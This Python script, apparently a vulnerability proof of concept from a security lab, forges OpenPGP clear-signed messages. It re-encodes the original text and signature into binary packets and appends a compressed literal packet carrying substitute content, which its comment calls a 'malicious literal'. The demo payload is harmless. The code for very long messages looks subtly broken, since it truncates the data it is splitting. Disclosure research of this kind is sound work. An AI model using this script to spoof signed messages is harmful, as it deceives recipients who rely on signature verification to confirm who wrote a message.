import re
import textwrap
import struct
import base64
import sys

# This script expects a clear-signed message in a file as its argument,
# and returns a spoofed variant containing a malicious literal (see line 65)

def make_header(type):
    return (0b11000000 | type).to_bytes()

def make_length_and_data(data):
    l = len(data)
    if l <= 191:
         # 1-octet
        return l.to_bytes() + data
    elif l <= 8383:
        # 2-octet
        return (((l - 192) >> 8) + 192).to_bytes() + ((l - 192) & 0xFF).to_bytes() + data
    elif l <= 0xFFFFFFFF:
        # 5-octet
        return b"\xFF" + struct.pack(">I", l) + data
    else:
        # partial, output chunks of 2**16 == (1 << (0xf0 & 0x1f))
        partials = bytearray()
        while l > 0x10000:
            partials += b"\xf0"
            data = data[:0x10000]
            partials += data
            l -= 0x10000
        # remainder may not be a partial type length (it will not be as it's < 0x10000)
        return partials + make_length_and_data(data)

def make_literal(payload):
    data = bytearray()
    data += b"b" # binary
    data += b"\x00" # filename
    data += b"\x00\x00\x00\x00" # timestamp
    data += payload
    return make_header(11) + make_length_and_data(data)

def make_compressed(algo, payload):
    data = bytearray()
    data += algo.to_bytes() # algorithm (0 = uncompressed, 1 = zip, 2 = zlib, 3 = bzip2)
    data += payload
    return make_header(8) + make_length_and_data(data)


with open(sys.argv[1], "r") as original_clearsign_file:
    original_clearsign = original_clearsign_file.read()

    # Extract parts from clearsigned message
    sig_parts = re.compile(r"-----BEGIN PGP SIGNED MESSAGE-----(.*?)-----BEGIN PGP SIGNATURE-----(.*?)-----END PGP SIGNATURE-----", re.MULTILINE | re.DOTALL)
    (message, signature) = sig_parts.findall(original_clearsign)[0]
    
    # Clean up signature (removing headers and padding) and decode
    signature_packet = base64.b64decode("".join(filter(lambda l: " " not in l and not l.startswith("="), signature.split("\n"))))

    # Clean up message (removing headers, replace newlines) and turn into literal
    message = ("\n\n".join(message.split("\n\n")[1:]).rstrip() + "\n").replace("\n","\r\n")
    message_packet = make_literal(message.encode('utf-8'))

    # Add spoofed message
    spoofed_message_packet = make_compressed(0, make_literal(b"Hello from Codean Labs."))

    # Concatenate and output the result (ASCII-armored)
    packet_list = message_packet + signature_packet + spoofed_message_packet
    
    print("-----BEGIN PGP MESSAGE-----\n")
    print(textwrap.fill(base64.b64encode(packet_list).decode("utf-8"), width=64))
    print("-----END PGP MESSAGE-----")